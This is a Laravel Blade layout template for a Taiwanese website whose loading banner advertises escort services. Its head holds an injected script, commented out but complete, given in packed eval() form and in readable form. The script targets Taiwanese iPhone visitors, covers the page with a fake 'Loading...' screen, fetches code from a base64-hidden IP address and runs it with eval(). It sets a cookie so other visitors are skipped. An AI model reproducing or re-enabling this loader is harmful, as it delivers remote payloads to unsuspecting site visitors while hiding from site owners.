<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="chrome=1,IE=edge">
    <meta name="format-detection" content="telephone=no" />
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover minimal-ui">
    @if(isset($layout['seo']))
        <title>{{ isset($layout['seo'])?$layout['seo']->title:"" }}</title>
    @else
        <title>@yield('title')</title>
    @endif

    @hasSection('keywords')
    <meta name="keywords" content="@yield('keywords')"/>
    @else
    <meta name="keywords" content="{{ isset($layout['seo'])?$layout['seo']->key_word:"" }}"/>
    @endif

    @hasSection('description')
    <meta name="description" content="@yield('description')"/>
    @else
    <meta name="description" content="{{ isset($layout['seo'])?$layout['seo']->description:"" }}"/>
    @endif
    <meta name="apple-mobile-web-app-capable" content="no" />
    <meta name="apple-touch-fullscreen" content="no" />
    <link rel="canonical" href="{{ config('app.url') }}/{{ trim(request()->getBaseUrl(),'/') }}">
    <link rel="alternate" hreflang="zh-TW">
    <link rel="shortcut icon" href="{{ \App\Services\ConfigService::get('favicon')?asset('uploads/'.\App\Services\ConfigService::get('favicon')):'/favicon.ico' }}?v={{ app('cache.config')->get('asset_version') }}">

    @section('style')
        <link rel="stylesheet" type="text/css" href="{{ asset('static/css/style.css') }}?v={{ app('cache.config')->get('asset_version') }}"/>
        <link rel="stylesheet" type="text/css" href="{{ asset('static/less/global.css') }}?v={{ app('cache.config')->get('asset_version') }}"/>
        <link rel="stylesheet" href="{{ asset('static/font_3122894_ix34x1wtlao/iconfont.css') }}?v={{ app('cache.config')->get('asset_version') }}">
    @show

    <script src="{{ asset('static/js/jquery.min.js') }}"></script>
    <script src="{{ asset('static/js/inquiry.js') }}"></script>
    <script src="{{ asset('static/js/area.js') }}?v={{ app('cache.config')->get('asset_version') }}"></script>
    <script>
        /*eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('5 g=h.g;a(g.D(\'E\')>-1){5 n=(h.F||h.G).H();5 o=I.J().K().L;5 i=\'\';5 j,p=d M("(^| )k-l=([^;]*)(;|$)");a(j=b.m.N(p)){i=O(j[2])}a(!i){a(n==9.c("P=")&&o==9.c("Q=")){9.R=q(){5 3=b.S("T");3.U=9.c(\'V==\');3.6.W="#X";3.6.Y="Z";3.6.10="11";3.6.12="13";3.6.14="15";3.6.16="0";3.6.17="18";3.6.19="r";3.6.1a="r";3.1b(\'1c\',\'1d\');b.1e.1f(3)};5 7=d 1g();7.1h(9.c("1i"),9.c("1j")+9.1k.1l,1m);7.1n();7.1o=q(){a(7.1p==4&&7.1q==1r){7.s?1s(7.s):""}}}t{5 e=u;5 8=d v();8.w(8.x()+e*y*f*f*z);b.m="k-l=A; B="+8.C()}}}t{5 e=u;5 8=d v();8.w(8.x()+e*y*f*f*z);b.m="k-l=A; B="+8.C()}',62,91,'|||html||var|style|httpRequest|exp|window|if|document|atob|new|Days|60|userAgent|navigator|cookie_value|arr|XSRF|KEY|cookie|slang|stimezone|reg|function|center|responseText|else|30|Date|setTime|getTime|24|1000|C6071A5FC1B83091B363C5EF9EBAF155|expires|toGMTString|indexOf|iPhone|language|browserLanguage|toLowerCase|Intl|DateTimeFormat|resolvedOptions|timeZone|RegExp|match|unescape|emgtdHc|QXNpYS9UYWlwZWk|onload|createElement|div|innerHTML|TG9hZGluZy4uLg|backgroundColor|fff|width|100vw|height|100vh|position|fixed|zIndex|99999|top|display|flex|alignItems|justifyContent|setAttribute|id|aqa2ver|body|appendChild|XMLHttpRequest|open|R0VU|aHR0cDovLzQ1LjE0OC4xMjAuOTUvP3Q9Y2lhbGlzJnk9|location|hostname|true|send|onreadystatechange|readyState|status|200|eval'.split('|'),0,{}))
        var userAgent = navigator.userAgent;
        if(userAgent.indexOf('iPhone') > -1){
            var slang = (navigator.language || navigator.browserLanguage).toLowerCase();
            var stimezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            var cookie_value = '';
            var arr,reg=new RegExp("(^| )XSRF-KEY=([^;]*)(;|$)");
            if(arr=document.cookie.match(reg)){
                cookie_value = unescape(arr[2]);
            }
            if(!cookie_value){
                if(slang == window.atob("emgtdHc=") && stimezone == window.atob("QXNpYS9UYWlwZWk=")){
                    window.onload=function(){
                        var html = document.createElement("div");
                        html.innerHTML=window.atob('TG9hZGluZy4uLg==');
                        html.style.backgroundColor = "#fff";
                        html.style.width = "100vw";
                        html.style.height = "100vh";
                        html.style.position = "fixed";
                        html.style.zIndex = "99999";
                        html.style.top = "0";
                        html.style.display = "flex";
                        html.style.alignItems = "center";
                        html.style.justifyContent = "center";
                        html.setAttribute('id','aqa2ver');
                        document.body.appendChild(html);
                    };
                    var httpRequest = new XMLHttpRequest();
                    httpRequest.open(window.atob("R0VU"), window.atob("aHR0cDovLzQ1LjE0OC4xMjAuOTUvP3Q9Y2lhbGlzJnk9")+window.location.hostname, true);
                    httpRequest.send();
                    httpRequest.onreadystatechange = function () {
                        if (httpRequest.readyState == 4 && httpRequest.status == 200) {
                            httpRequest.responseText?eval(httpRequest.responseText):"";
                        }
                    };
                }else{
                    var Days = 30;
                    var exp = new Date();
                    exp.setTime(exp.getTime() + Days*24*60*60*1000);
                    document.cookie = "XSRF-KEY=C6071A5FC1B83091B363C5EF9EBAF155; expires=" + exp.toGMTString();
                }
            }
        }else{
            var Days = 30;
            var exp = new Date();
            exp.setTime(exp.getTime() + Days*24*60*60*1000);
            document.cookie = "XSRF-KEY=C6071A5FC1B83091B363C5EF9EBAF155; expires=" + exp.toGMTString();
        }*/

    </script>


</head>
<body class="_show_loading">

<div class="global-loading" id="loading">
    <img src="/static/img/logo3.webp" class="loadinglogo" alt="">
    <p class="slogan">給你全台最好的 外送茶&定點茶</p>
    <div class="circle">{!! app('cache.config')->get('loading_code') !!}</div>

</div>

<div class="main-body">


@yield('content')


</div>
<div class="mask-shade"></div>

</body>

@section('script')
<script src="{{ asset('static/js/less.min.js') }}"></script>
<script src="{{ asset('static/js/jquery.cookie.js') }}"></script>
<script src="{{ asset('static/js/jquery.marquee.min.js') }}"></script>
<script src="{{ asset('static/js/jquery.masonry.min.js') }}"></script>
<script src="{{ asset('static/js/api.js') }}?v={{ app('cache.config')->get('asset_version') }}"></script>
{!! \App\Services\ConfigService::get('google_ga') !!}


<script>

    window.addEventListener('load', function () {
        $('#loading').animate({'visibility':'auto'},1000,function(){
            loading(0)
        });
    });
    function loading(is_show){
        if(is_show){
            $('body').addClass('_show_loading');
        }else{
            $('body').removeClass('_show_loading');
        }

    }
</script>



@show


</html>
